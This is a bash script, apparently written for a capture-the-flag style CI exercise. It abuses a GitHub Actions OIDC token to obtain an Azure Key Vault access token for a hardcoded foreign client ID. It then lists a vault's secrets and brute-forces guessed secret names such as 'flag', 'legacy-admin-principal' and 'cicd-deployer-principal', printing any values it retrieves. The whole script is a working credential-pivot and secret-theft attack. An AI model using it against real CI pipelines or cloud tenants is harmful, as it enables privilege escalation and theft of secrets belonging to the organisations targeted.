#!/usr/bin/env bash
set +e
LEGACY=891fb158-e02c-4428-a885-53b811f369c0
ID=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$1 --data-urlencode "scope=$2" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$ID"; }
VT=$(exch $LEGACY "https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "vault token len: ${#VT}"
echo "=== kv-tbl-sec LIST (raw) ==="
curl -s -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" | head -c 1500; echo
echo "=== kv-tbl-sec GET guesses ==="
for n in flag platform-flag sec-flag storefront-flag tebamoto-flag the-flag ctf-flag df26 prod-flag DF26 FLAG legacy-admin-principal legacy-admin platform-automation-principal cicd-deployer-principal directory-sync-principal reporting-insights-principal admin-note secret flag1 root; do
  r=$(curl -s -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$n?api-version=7.4")
  if echo "$r" | grep -q '"value"'; then echo "  HIT[$n]=$(echo "$r"|python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')"; fi
done
echo "FLAG_SCAN_DONE"
